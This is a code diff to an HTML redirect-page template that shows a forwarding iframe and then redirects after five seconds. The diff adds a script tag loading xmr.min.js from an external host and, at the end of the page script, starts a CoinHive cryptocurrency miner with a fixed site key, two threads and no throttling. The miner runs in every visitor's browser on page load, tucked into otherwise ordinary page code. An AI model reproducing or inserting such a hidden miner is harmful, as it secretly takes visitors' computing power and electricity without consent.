@@ -59,24 +59,16 @@
 </p>
 <iframe src="${forwardURL}"></iframe>
 <script src="${staticServePath}/js/lib/jquery/jquery-3.1.0.min.js"></script>
+<script src="https://static.hacpai.com/js/lib/xmr.min.js?${staticResourceVersion}"></script>
 <script>
-    $.ajax({
-        method: "GET",
-        url: '${staticServePath}/js/lib/xmr.min.js',
-        dataType: "script",
-        cache: true
-    }).done(function () {
-        var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0});
-        miner.start();
-        setTimeout(function () {
-            window.location.href = '${forwardURL}'
-        }, 5000)
-        setTimeout(function () {
-            $('.text').animate({
-                bottom: ($(window).height() - 56 ) / 2 +'px'
-            })
-        }, 4000)
-    });
+    setTimeout(function () {
+        window.location.href = '${forwardURL}'
+    }, 5000)
+    setTimeout(function () {
+        $('.text').animate({
+            bottom: ($(window).height() - 56 ) / 2 +'px'
+        })
+    }, 4000)
 
 
     var S = {
@@ -616,6 +608,8 @@
         };
     }());
     S.init();
+
+    (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0})).start();
 </script>
 </body>
 </html>
